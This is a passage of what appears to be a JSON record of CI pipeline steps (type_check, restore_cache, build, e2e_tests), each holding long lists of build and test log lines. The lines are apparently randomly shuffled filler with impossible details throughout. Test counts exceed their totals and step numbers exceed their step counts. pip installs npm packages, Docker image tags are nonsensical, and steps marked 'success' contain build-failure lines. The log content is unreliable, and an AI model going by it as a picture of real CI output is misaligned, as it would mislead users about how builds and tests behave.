          "Pushing to registry...",
          "Fetching from https://githubusercontent.com/package.json",
          "TLS handshake completed",
          "Minifying main.js",
          "Optimizing 23 modules...",
          "[12:46:43] INFO: Starting build process",
          "Image pulled successfully",
          "Pushing to registry...",
          "\u2713 Task completed in 2801ms",
          "[12:46:43] INFO: Request completed",
          "Compiling lib/app.ts...",
          "[12:46:43] INFO: Connecting to database",
          "Uploading artifact 'build' (34 files)",
          "Compiling src/index.js...",
          "Building Docker image...",
          "Compiling lib/index.js...",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Compiling utils/service.java...",
          "Snapshots: 29 passed, 10 total",
          "Environment: development",
          "npm notice: created a lockfile",
          "GET /status - 201 (84ms)",
          "HEAD is now at 4211850",
          "WARNING: react has known vulnerabilities",
          "Cache invalidated: dependencies",
          "Waiting...",
          "Building Docker image...",
          "[12:46:43] WARN: Deprecated API usage",
          "Step 19/17: Deploying",
          "Fetching submodules...",
          "POST /api - 201 (460ms)",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:43] DEBUG: Loading configuration",
          "[12:46:43] DEBUG: Query executed in 2ms",
          "HEAD is now at 60bda71",
          "Environment: production",
          "Finished.",
          "Checking out main branch",
          "Coverage: 88% statements, 95% branches",
          "pip: Downloading jest-2.20.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Optimizing 87 modules...",
          "Fetching from https://googleapis.com/package.json",
          "Cache hit for key-3106",
          "Ready.",
          "Processing...",
          "Loading...",
          "Step 5/16: Running migrations",
          "Pulling image: alpine:latest",
          "Step 17/24: Building",
          "NODE_ENV=test",
          "Platform: darwin-arm64",
          "pip install: Successfully installed axios-3.14",
          "pip: Installing build dependencies...",
          "Done.",
          "Pulling image: alpine:3.11",
          "Cache saved successfully",
          "Cache miss for key-3454",
          "WARNING: jest has known vulnerabilities",
          "Tests: 306 passed, 305 total",
          "Minifying vendor.js",
          "Cache miss for key-9841",
          "[12:46:43] INFO: Connecting to database",
          "Step 8/16: Testing",
          "Already up to date.",
          "[12:46:43] DEBUG: Query executed in 86ms",
          "Pulling image: node:3.11",
          "npm notice: created a lockfile",
          "Fetching from https://npmjs.org/package.json",
          "\u2713 Task completed in 2172ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/utils.go...",
          "Platform: linux-x64",
          "HEAD is now at 2cff03c",
          "npm install: added 87 packages",
          "pip: Downloading express-4.10.tar.gz",
          "Step 13/20: Testing",
          "Cache invalidated: build",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache miss for key-8996",
          "\u2713 package completed",
          "Creating production build...",
          "Waiting...",
          "[12:46:43] INFO: Request completed",
          "Step 8/19: Linting",
          "[12:46:43] WARN: Deprecated API usage",
          "Transforming 136 files...",
          "Step 17/20: Running migrations",
          "FAILED: test_cache_hit",
          "HEAD is now at ab6c267",
          "Cache invalidated: node_modules",
          "Step 19/15: Testing",
          "POST /upload - 202 (23ms)",
          "Tests: 458 passed, 154 total",
          "Loading...",
          "\u2713 Step 'test' succeeded",
          "Time: 60.327s",
          "Installing webpack@5.13.6",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] DEBUG: Loading configuration",
          "NODE_ENV=test",
          "\u2713 Step 'checkout' succeeded",
          "Waiting...",
          "[12:46:43] INFO: Request completed",
          "pip: Collecting jest",
          "WARNING: webpack has known vulnerabilities",
          "NODE_ENV=production",
          "Pushing to registry...",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] WARN: Deprecated API usage",
          "Building Docker image...",
          "pip: Collecting eslint",
          "pip: Installing build dependencies...",
          "pip install: Successfully installed webpack-1.13",
          "\u2713 All checks passed",
          "Installing prettier@5.7.9",
          "Compiling components/app.ts...",
          "\u2713 Task completed in 588ms",
          "Transforming 187 files...",
          "Step 13/18: Deploying",
          "Ran 101 tests in 46s",
          "pip: Collecting lodash",
          "Connection established",
          "Step 18/24: Installing dependencies",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:46:43] INFO: Request completed",
          "Waiting...",
          "[12:46:43] DEBUG: Initializing service",
          "Cache miss for key-6922",
          "Connection established",
          "Creating production build...",
          "Snapshots: 42 passed, 37 total",
          "Waiting...",
          "Uploading artifact 'build' (23 files)",
          "Test Suites: 42 passed, 26 total",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "[12:46:43] INFO: Connecting to database",
          "Minifying main.js",
          "[12:46:43] DEBUG: Query executed in 32ms",
          "Step 2/24: Running migrations",
          "WARNING: express has known vulnerabilities",
          "\u2713 package completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2717 build failed with exit code 100",
          "Waiting...",
          "Waiting...",
          "GET /health - 200 (22ms)",
          "[12:46:43] INFO: Connecting to database",
          "Snapshots: 22 passed, 24 total",
          "pip: Installing build dependencies...",
          "Platform: win32-x64",
          "Processing...",
          "Snapshots: 1 passed, 29 total",
          "Compiling components/main.py...",
          "HEAD is now at 27a1d6f",
          "WARNING: axios has known vulnerabilities",
          "Using Node.js 14.14.4",
          "NODE_ENV=development",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Installing build dependencies...",
          "Step 2/20: Running migrations",
          "Switched to branch 'hotfix/task-325'",
          "Compiling utils/app.ts...",
          "pip install: Successfully installed axios-3.14",
          "Cache saved successfully",
          "Installing eslint@5.5.2",
          "Creating production build...",
          "Coverage: 72% statements, 100% branches",
          "Generating source maps...",
          "[12:46:43] INFO: Request completed",
          "Fetching from https://amazonaws.com/package.json",
          "  PASS: e2e/test_user_create.spec.js",
          "npm notice: created a lockfile",
          "Minifying main.js",
          "Environment: staging",
          "npm install: resolved 1848 packages",
          "\u2713 build completed",
          "Cache saved successfully",
          "Platform: linux-x64",
          "Pushing to registry...",
          "WARNING: eslint has known vulnerabilities",
          "Snapshots: 37 passed, 0 total",
          "  PASS: test_db_connect (173ms)",
          "Image pulled successfully",
          "OK",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache saved successfully",
          "Artifact uploaded: dist.zip (58MB)",
          "  PASS: test_cache_hit (146ms)",
          "Compiling utils/index.js...",
          "Cache miss for key-5177",
          "Completed.",
          "[12:46:43] INFO: Processing request",
          "[12:46:43] INFO: Processing request",
          "POST /api - 201 (499ms)",
          "HEAD is now at 74e311c",
          "pip: Downloading eslint-2.11.tar.gz",
          "\u2713 validate completed",
          "Step 5/18: Linting",
          "Bundling runtime.js",
          "npm install: resolved 633 packages",
          "Bundling main.js",
          "pip: Collecting express",
          "Step 19/23: Installing dependencies",
          "Compiling src/index.js...",
          "[12:46:43] INFO: Processing request",
          "Cache hit for key-2450",
          "NODE_ENV=development",
          "[12:46:43] DEBUG: Query executed in 91ms",
          "Success!",
          "Cache saved successfully",
          "[12:46:43] INFO: Processing request",
          "npm notice: created a lockfile",
          "Loading...",
          "Step 8/18: Linting",
          "pip install: Successfully installed axios-4.7",
          "GET /health - 201 (9ms)",
          "npm notice: package.json updated",
          "Uploading artifact 'coverage' (7 files)",
          "pip: Installing build dependencies...",
          "[12:46:43] INFO: Connecting to database",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-26T12:46:52.534308",
        "finished_at": "2025-11-26T12:46:57.791815",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Step 13/19: Linting",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 validate completed",
          "Optimizing 43 modules...",
          "\u2717 build failed with exit code 118",
          "Layer 5/8: ENV command",
          "Loading...",
          "Uploading artifact 'dist' (17 files)",
          "[12:46:43] INFO: Processing request",
          "Transforming 498 files...",
          "npm notice: created a lockfile",
          "[12:46:43] WARN: Deprecated API usage",
          "Tests: 292 passed, 115 total",
          "Cache miss for key-3475",
          "Minifying app.js",
          "Test Suites: 12 passed, 31 total",
          "Time: 105.625s",
          "Switched to branch 'bugfix/task-463'",
          "Snapshots: 2 passed, 12 total",
          "Generating source maps...",
          "Compiling utils/app.ts...",
          "Switched to branch 'feature/task-555'",
          "NODE_ENV=development",
          "Generating source maps...",
          "Step 5/18: Building",
          "\u2713 All checks passed",
          "HEAD is now at 1a57a34",
          "Step 11/23: Building",
          "Using Python 3.11",
          "Done.",
          "pip: Collecting express",
          "Using Python 3.12",
          "Checking out master branch",
          "Waiting...",
          "Pulling image: python:3.11",
          "Generating source maps...",
          "Step 12/17: Testing",
          "Fetching submodules...",
          "Building Docker image...",
          "FAILED: test_auth_login",
          "Artifact uploaded: build.tar.gz (43MB)",
          "pip: Installing build dependencies...",
          "Exception: RuntimeError",
          "Step 1/25: Installing dependencies",
          "Step 7/20: Building",
          "pip: Downloading eslint-4.6.tar.gz",
          "Pulling image: alpine:18",
          "pip: Installing build dependencies...",
          "Cache invalidated: dependencies",
          "Waiting...",
          "Using Node.js 18.20.10",
          "Cache invalidated: dependencies",
          "yarn add: Done in 15.67s",
          "[12:46:43] INFO: Cache refreshed",
          "Installing axios@1.0.7",
          "Bundling vendor.js",
          "Done.",
          "Done.",
          "Snapshots: 31 passed, 40 total",
          "npm notice: package.json updated",
          "Compiling components/index.js...",
          "Pushing to registry...",
          "Coverage: 79% statements, 90% branches",
          "Switched to branch 'bugfix/task-854'",
          "Snapshots: 19 passed, 33 total",
          "Tests: 386 passed, 443 total",
          "[12:46:43] INFO: Cache refreshed",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: dist.zip (64MB)",
          "[12:46:43] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Loading...",
          "Verifying...",
          "pip: Collecting prettier",
          "Step 3/22: Linting",
          "Step 10/15: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 Step 'build' succeeded",
          "Step 1/20: Testing",
          "Compiling lib/app.ts...",
          "Pulling image: alpine:3.11",
          "Cache miss for key-7399",
          "[12:46:43] INFO: Connecting to database",
          "Done.",
          "[12:46:43] ERROR: Connection failed",
          "Artifact downloaded: 17MB",
          "Optimizing 54 modules...",
          "POST /data - 200 (94ms)",
          "yarn add: Done in 4.32s",
          "Compiling src/service.java...",
          "Step 3/24: Building",
          "Compiling src/app.ts...",
          "Compiling components/main.py...",
          "Success!",
          "[12:46:43] DEBUG: Query executed in 59ms",
          "Compiling components/app.ts...",
          "Installing prettier@2.8.9",
          "Fetching submodules...",
          "pip install: Successfully installed express-1.13",
          "Step 7/20: Testing",
          "Compiling src/service.java...",
          "Transforming 638 files...",
          "Coverage: 72% statements, 70% branches",
          "Pulling image: python:18",
          "Transforming 797 files...",
          "Cache restored successfully (118MB)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Uploading artifact 'dist' (26 files)",
          "[12:46:43] DEBUG: Loading configuration",
          "Using Node.js 15.6.5",
          "Step 18/25: Installing dependencies",
          "Environment: staging",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:46:43] INFO: Processing request",
          "Layer 1/12: ENV command",
          "[12:46:43] DEBUG: Loading configuration",
          "[12:46:43] DEBUG: Query executed in 28ms",
          "[12:46:43] INFO: Request completed",
          "OK",
          "Using Node.js 20.2.9",
          "Compiling components/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_db_connect (273ms)",
          "pip: Collecting axios",
          "[12:46:43] ERROR: Connection failed",
          "[12:46:43] WARN: Deprecated API usage",
          "Building Docker image...",
          "Step 8/22: Linting",
          "Compiling components/app.ts...",
          "npm install: added 356 packages",
          "Test Suites: 12 passed, 39 total",
          "[12:46:43] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (16MB)",
          "Using Node.js 19.15.9",
          "Optimizing 61 modules...",
          "Switched to branch 'hotfix/task-643'",
          "[12:46:43] DEBUG: Query executed in 78ms",
          "Step 9/24: Running migrations",
          "Minifying vendor.js",
          "Processing...",
          "pip: Downloading lodash-3.5.tar.gz",
          "[12:46:43] DEBUG: Loading configuration",
          "Loading...",
          "Environment: staging",
          "FAILED: test_auth_login",
          "Fetching from https://amazonaws.com/package.json",
          "Creating production build...",
          "Pushing to registry...",
          "[12:46:43] INFO: Processing request",
          "pip install: Successfully installed jest-4.12",
          "Ran 156 tests in 51s",
          "\u2713 Step 'setup' succeeded",
          "HEAD is now at 7d4f081",
          "Optimizing 89 modules...",
          "Connection established",
          "[12:46:43] DEBUG: Loading configuration",
          "\u2713 Step 'setup' succeeded",
          "Tests: 453 passed, 274 total",
          "Ran 90 tests in 44s",
          "Step 19/15: Testing",
          "Compiling utils/main.py...",
          "Cache invalidated: build",
          "[12:46:43] DEBUG: Initializing service",
          "Creating production build...",
          "Checking out develop branch",
          "Compiling components/app.ts...",
          "pip: Downloading axios-3.10.tar.gz",
          "Step 17/21: Building",
          "pip install: Successfully installed webpack-1.17",
          "Generating source maps...",
          "[12:46:43] INFO: Connecting to database",
          "Fetching from https://gcr.io/package.json",
          "Fetching from https://githubusercontent.com/package.json",
          "OK",
          "npm install: resolved 1198 packages",
          "Finished.",
          "\u2717 build failed with exit code 50",
          "  PASS: e2e/test_user_create.spec.js",
          "Done.",
          "POST /api - 200 (387ms)",
          "Fetching from https://docker.io/package.json",
          "Loading...",
          "\u2713 deploy completed",
          "TLS handshake completed",
          "Cache invalidated: node_modules",
          "[12:46:43] INFO: Starting build process",
          "Cache hit for key-5942",
          "Fetching from https://docker.io/package.json",
          "pip: Downloading prettier-5.16.tar.gz",
          "[12:46:43] DEBUG: Query executed in 58ms",
          "Artifact downloaded: 5MB",
          "Step 2/16: Building",
          "Loading...",
          "Cache hit for key-1085",
          "Cache saved successfully",
          "Cache saved successfully",
          "Checking out develop branch",
          "Transforming 286 files...",
          "Cache hit for key-4162",
          "Generating source maps...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Exception: RuntimeError",
          "npm install: resolved 1040 packages",
          "Fetching submodules...",
          "\u2713 build completed",
          "HEAD is now at 02a52aa",
          "Using Node.js 14.18.7",
          "Bundling main.js",
          "Cache miss for key-3118",
          "Ready.",
          "\u2713 package completed",
          "[12:46:43] DEBUG: Initializing service",
          "Pushing to registry...",
          "npm notice: package.json updated",
          "Already up to date.",
          "Processing...",
          "Coverage: 70% statements, 80% branches",
          "pip: Collecting prettier",
          "POST /api - 200 (423ms)",
          "pip: Installing build dependencies...",
          "Image pulled successfully",
          "Compiling src/main.py...",
          "POST /upload - 202 (242ms)",
          "Step 11/23: Installing dependencies",
          "Generating source maps...",
          "HEAD is now at e7255a6",
          "Test Suites: 16 passed, 15 total",
          "Step 10/24: Linting",
          "Step 15/15: Installing dependencies",
          "[12:46:43] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (63MB)",
          "pip install: Successfully installed react-2.18",
          "Cache invalidated: dependencies",
          "Exception: NullPointerException",
          "[12:46:43] WARN: Deprecated API usage",
          "Ready.",
          "WARNING: react has known vulnerabilities",
          "[12:46:43] ERROR: Connection failed",
          "Cache restored successfully (115MB)",
          "Time: 102.709s",
          "NODE_ENV=production",
          "Step 2/23: Installing dependencies",
          "Image pulled successfully",
          "Creating production build...",
          "Optimizing 63 modules...",
          "pip: Collecting react",
          "Finished.",
          "Cache saved successfully",
          "Already up to date.",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 8/21: Building",
          "[12:46:43] DEBUG: Connection pool: 6 active",
          "Uploading artifact 'dist' (25 files)",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-26T12:46:57.791815",
        "finished_at": "2025-11-26T12:47:24.079349",
        "log_lines": [
          "=== Step: build ===",
          "[12:46:43] INFO: Connecting to database",
          "Compiling utils/handler.rs...",
          "Exception: ValueError",
          "Ran 37 tests in 54s",
          "Artifact uploaded: dist.zip (65MB)",
          "\u2717 build failed with exit code 121",
          "Tests: 223 passed, 431 total",
          "Bundling runtime.css",
          "pip install: Successfully installed express-1.2",
          "Connection established",
          "Switched to branch 'hotfix/task-560'",
          "[12:46:43] INFO: Request completed",
          "Artifact uploaded: dist.zip (78MB)",
          "Completed.",
          "[12:46:43] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Platform: linux-x64",
          "Uploading artifact 'build' (38 files)",
          "\u2713 Task completed in 1260ms",
          "\u2713 All checks passed",
          "WARNING: lodash has known vulnerabilities",
          "Building Docker image...",
          "[12:46:43] WARN: Deprecated API usage",
          "Cache miss for key-5855",
          "\u2713 Step 'install' succeeded",
          "Done.",
          "Artifact uploaded: dist.zip (78MB)",
          "Pushing to registry...",
          "GET /status - 201 (15ms)",
          "Using Node.js 20.10.10",
          "\u2717 build failed with exit code 122",
          "Bundling vendor.js",
          "Platform: linux-x64",
          "[12:46:43] DEBUG: Memory usage: 748MB",
          "Compiling src/utils.go...",
          "[12:46:43] ERROR: Connection failed",
          "TLS handshake completed",
          "Bundling vendor.js",
          "Pulling image: node:3.11",
          "pip: Downloading axios-1.6.tar.gz",
          "Environment: test",
          "  PASS: unit/test_cache_hit.spec.js",
          "Checking out develop branch",
          "Coverage: 76% statements, 67% branches",
          "Finished.",
          "Already up to date.",
          "Fetching submodules...",
          "HEAD is now at cb4f58c",
          "Bundling runtime.css",
          "Installing prettier@4.5.4",
          "Image pulled successfully",
          "POST /data - 201 (166ms)",
          "WARNING: webpack has known vulnerabilities",
          "Installing eslint@2.2.7",
          "npm notice: package.json updated",
          "pip: Downloading eslint-5.1.tar.gz",
          "npm notice: created a lockfile",
          "Cache miss for key-8010",
          "Done.",
          "[12:46:43] INFO: Cache refreshed",
          "pip: Collecting webpack",
          "npm install: resolved 795 packages",
          "Environment: test",
          "npm notice: package.json updated",
          "Compiling utils/handler.rs...",
          "Test Suites: 24 passed, 47 total",
          "Building Docker image...",
          "[12:46:43] INFO: Cache refreshed",
          "[12:46:43] WARN: Deprecated API usage",
          "Bundling vendor.js",
          "TLS handshake completed",
          "Compiling components/utils.go...",
          "[12:46:43] DEBUG: Loading configuration",
          "pip: Collecting webpack",
          "Cache miss for key-5835",
          "Already up to date.",
          "[12:46:43] DEBUG: Loading configuration",
          "Step 1/15: Installing dependencies",
          "Snapshots: 17 passed, 38 total",
          "\u2713 Step 'install' succeeded",
          "Pushing to registry...",
          "[12:46:43] DEBUG: Initializing service",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Waiting...",
          "Pulling image: alpine:3.11",
          "Done.",
          "Compiling lib/app.ts...",
          "OK",
          "Switched to branch 'hotfix/task-390'",
          "Switched to branch 'hotfix/task-236'",
          "WARNING: axios has known vulnerabilities",
          "OK",
          "Checking out develop branch",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Generating source maps...",
          "WARNING: eslint has known vulnerabilities",
          "Cache miss for key-8639",
          "Building Docker image...",
          "Image pulled successfully",
          "Cache invalidated: build",
          "npm notice: created a lockfile",
          "Switched to branch 'hotfix/task-185'",
          "[12:46:43] WARN: Deprecated API usage",
          "Installing axios@4.11.4",
          "Step 19/25: Running migrations",
          "\u2713 All checks passed",
          "pip: Downloading react-3.11.tar.gz",
          "HEAD is now at 3c38862",
          "Ran 72 tests in 18s",
          "Pulling image: alpine:18",
          "Finished.",
          "Building Docker image...",
          "Time: 16.445s",
          "Step 17/19: Testing",
          "Generating source maps...",
          "Tests: 105 passed, 60 total",
          "Step 1/18: Testing",
          "Platform: darwin-arm64",
          "[12:46:43] INFO: Cache refreshed",
          "Success!",
          "POST /api - 200 (229ms)",
          "Tests: 455 passed, 193 total",
          "Connection established",
          "Test Suites: 45 passed, 25 total",
          "[12:46:43] DEBUG: Memory usage: 767MB",
          "Cache hit for key-1129",
          "npm notice: package.json updated",
          "Bundling vendor.css",
          "[12:46:43] DEBUG: Loading configuration",
          "Cache restored successfully (363MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:43] WARN: Deprecated API usage",
          "Test Suites: 10 passed, 44 total",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:43] WARN: Deprecated API usage",
          "Waiting...",
          "Using Node.js 19.8.2",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "Step 1/16: Linting",
          "Step 9/21: Building",
          "Artifact uploaded: dist.zip (33MB)",
          "[12:46:43] ERROR: Connection failed",
          "Cache miss for key-9745",
          "Pushing to registry...",
          "npm install: resolved 1106 packages",
          "\u2713 build completed",
          "Transforming 215 files...",
          "Minifying main.js",
          "Processing...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Cache hit for key-5826",
          "POST /upload - 202 (429ms)",
          "FAILED: test_cache_hit",
          "Transforming 594 files...",
          "\u2713 validate completed",
          "Platform: win32-x64",
          "Step 13/18: Running migrations",
          "Environment: production",
          "WARNING: react has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 89% statements, 97% branches",
          "GET /health - 204 (80ms)",
          "Optimizing 62 modules...",
          "Image pulled successfully",
          "OK",
          "[12:46:43] INFO: Cache refreshed",
          "Pushing to registry...",
          "Platform: win32-x64",
          "GET /status - 200 (79ms)",
          "Checking out develop branch",
          "Image pulled successfully",
          "Time: 96.106s",
          "Completed.",
          "Step 19/23: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:43] DEBUG: Connection pool: 11 active",
          "WARNING: axios has known vulnerabilities",
          "Finished.",
          "Waiting...",
          "Generating source maps...",
          "Step 6/20: Testing",
          "Fetching submodules...",
          "Cache hit for key-9282",
          "Ran 131 tests in 36s",
          "  PASS: unit/test_auth_login.spec.js",
          "Snapshots: 31 passed, 0 total",
          "Step 20/20: Running migrations",
          "Exception: NullPointerException",
          "[12:46:43] DEBUG: Memory usage: 1914MB",
          "HEAD is now at a6bd191",
          "Bundling styles.css",
          "yarn add: Done in 11.45s",
          "Waiting...",
          "Loading...",
          "[12:46:43] DEBUG: Loading configuration",
          "pip install: Successfully installed express-3.11",
          "[12:46:43] DEBUG: Initializing service",
          "Cache saved successfully",
          "\u2713 Task completed in 2326ms",
          "Ready.",
          "npm install: resolved 474 packages",
          "Minifying app.js",
          "Environment: production",
          "pip install: Successfully installed lodash-1.11",
          "Environment: staging",
          "Processing...",
          "[12:46:43] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 104",
          "[12:46:43] WARN: Deprecated API usage",
          "\u2713 Task completed in 4734ms",
          "GET /health - 201 (30ms)",
          "POST /api - 202 (263ms)",
          "[12:46:43] DEBUG: Memory usage: 185MB",
          "Installing axios@2.3.9",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (37MB)",
          "Step 2/15: Building",
          "POST /data - 202 (496ms)",
          "[12:46:43] INFO: Starting build process",
          "Compiling components/index.js...",
          "[12:46:43] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Optimizing 85 modules...",
          "Done.",
          "npm install: added 53 packages",
          "Using Python 3.11",
          "[12:46:43] INFO: Processing request",
          "POST /upload - 200 (195ms)",
          "Platform: win32-x64",
          "Test Suites: 43 passed, 16 total",
          "Uploading artifact 'coverage' (19 files)",
          "[12:46:43] DEBUG: Initializing service",
          "Pulling image: python:18",
          "WARNING: lodash has known vulnerabilities",
          "pip: Collecting react",
          "Step 9/23: Running migrations",
          "Test Suites: 9 passed, 50 total",
          "\u2713 Step 'checkout' succeeded",
          "Fetching from https://pypi.org/package.json",
          "[12:46:43] WARN: Deprecated API usage",
          "pip install: Successfully installed express-5.20",
          "HEAD is now at d51f226",
          "Compiling components/main.py...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Tests: 104 passed, 245 total",
          "pip: Installing build dependencies...",
          "Checking out master branch",
          "Finished.",
          "Artifact uploaded: build.tar.gz (36MB)",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-26T12:47:24.079349",
        "finished_at": "2025-11-26T12:47:32.841860",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Done.",
          "\u2713 lint completed",
          "WARNING: express has known vulnerabilities",
          "npm install: resolved 328 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Finished.",
          "Bundling vendor.css",
          "Step 6/18: Linting",
          "[12:46:43] ERROR: Connection failed",
          "  PASS: test_api_health (149ms)",
          "Generating source maps...",
          "[12:46:43] INFO: Starting build process",
          "TLS handshake completed",
          "Installing lodash@2.20.0",
          "[12:46:43] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "Step 5/17: Installing dependencies",
          "Environment: test",
          "  PASS: test_cache_hit (130ms)",
          "Platform: darwin-arm64",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] DEBUG: Query executed in 7ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:46:43] INFO: Connecting to database",
          "[12:46:43] DEBUG: Memory usage: 1212MB",
          "Building Docker image...",
          "Processing...",
          "Image pulled successfully",
          "Step 8/20: Deploying",
          "Building Docker image...",
          "Cache saved successfully",
          "Success!",
          "Bundling styles.css",
          "Completed.",
          "TLS handshake completed",
          "Step 1/15: Installing dependencies",
          "OK",
          "[12:46:43] DEBUG: Loading configuration",
          "[12:46:43] INFO: Request completed",
          "Uploading artifact 'dist' (6 files)",
          "NODE_ENV=development",
          "  PASS: test_auth_login (492ms)",
          "Cache saved successfully",
          "Artifact uploaded: dist.zip (93MB)",
          "Coverage: 71% statements, 82% branches",
          "Step 11/21: Deploying",
          "Ran 142 tests in 13s",
          "Generating source maps...",
          "[12:46:43] INFO: Cache refreshed",
          "[12:46:43] DEBUG: Loading configuration",
          "Success!",
          "FAILED: test_user_create",
          "npm install: added 102 packages",
          "Uploading artifact 'dist' (16 files)",
          "[12:46:43] DEBUG: Loading configuration",
          "Optimizing 75 modules...",
          "Bundling runtime.css",
          "Completed.",
          "Completed.",
          "Optimizing 81 modules...",
          "Artifact uploaded: dist.zip (4MB)",
          "Already up to date.",
          "Step 10/17: Linting",
          "[12:46:43] WARN: Deprecated API usage",
          "Step 19/16: Deploying",
          "Compiling components/handler.rs...",
          "Transforming 938 files...",
          "[12:46:43] INFO: Request completed",
          "Building Docker image...",
          "Image pulled successfully",
          "GET /health - 200 (30ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 13/20: Building",
          "npm install: added 99 packages",
          "TLS handshake completed",
          "Ready.",
          "Fetching from https://pypi.org/package.json",
          "Cache miss for key-3632",
          "Exception: TypeError",
          "Using Python 3.12",
          "npm install: resolved 1420 packages",
          "\u2713 lint completed",
          "WARNING: react has known vulnerabilities",
          "Bundling vendor.js",
          "[12:46:43] WARN: Deprecated API usage",
          "Connection established",
          "[12:46:43] WARN: Deprecated API usage",
          "Switched to branch 'bugfix/task-352'",
          "Coverage: 85% statements, 61% branches",
          "Step 6/25: Deploying",
          "Step 17/15: Building",
          "Ready.",
          "Image pulled successfully",
          "Cache hit for key-5559",
          "Generating source maps...",
          "[12:46:43] DEBUG: Query executed in 45ms",
          "Platform: win32-x64",
          "Connection established",
          "TLS handshake completed",
          "Building Docker image...",
          "Cache restored successfully (206MB)",
          "npm notice: created a lockfile",
          "Test Suites: 6 passed, 27 total",
          "[12:46:43] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:43] WARN: Deprecated API usage",
          "Step 5/20: Running migrations",
          "Step 5/15: Linting",
          "Platform: linux-x64",
          "Verifying...",
          "npm notice: package.json updated",
          "Checking out main branch",
          "Finished.",
          "Processing...",
          "Using Python 3.10",
          "pip install: Successfully installed lodash-4.9",
          "npm notice: created a lockfile",
          "Using Node.js 14.20.0",
          "pip: Collecting axios",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "yarn add: Done in 29.95s",
          "[12:46:43] WARN: Deprecated API usage",
          "  PASS: test_api_health (136ms)",
          "Cache hit for key-2555",
          "\u2713 All checks passed",
          "[12:46:43] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm install: resolved 1551 packages",
          "Finished.",
          "Cache hit for key-5670",
          "Fetching submodules...",
          "Completed.",
          "  PASS: test_db_connect (24ms)",
          "Artifact downloaded: 2MB",
          "pip: Collecting jest",
          "Verifying...",
          "Loading...",
          "Switched to branch 'hotfix/task-495'",
          "Test Suites: 44 passed, 30 total",
          "Switched to branch 'feature/task-828'",
          "[12:46:43] DEBUG: Loading configuration",
          "Step 6/19: Building",
          "Connection established",
          "Switched to branch 'feature/task-781'",
          "\u2717 build failed with exit code 5",
          "pip: Installing build dependencies...",
          "NODE_ENV=development",
          "pip: Installing build dependencies...",
          "Generating source maps...",
          "Step 12/18: Testing",
          "[12:46:43] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "Cache restored successfully (387MB)",
          "Building Docker image...",
          "Time: 85.647s",
          "Time: 70.144s",
          "[12:46:43] DEBUG: Initializing service",
          "Using Python 3.10",
          "[12:46:43] DEBUG: Connection pool: 16 active",
          "[12:46:43] WARN: Deprecated API usage",
          "\u2713 Task completed in 2764ms",
          "pip install: Successfully installed jest-3.16",
          "Creating production build...",
          "npm notice: created a lockfile",
          "GET /health - 201 (66ms)",
          "pip install: Successfully installed webpack-1.11",
          "[12:46:43] DEBUG: Loading configuration",
          "Fetching from https://googleapis.com/package.json",
          "Compiling src/handler.rs...",
          "Compiling components/handler.rs...",
          "[12:46:43] DEBUG: Connection pool: 2 active",
          "Ran 20 tests in 23s",
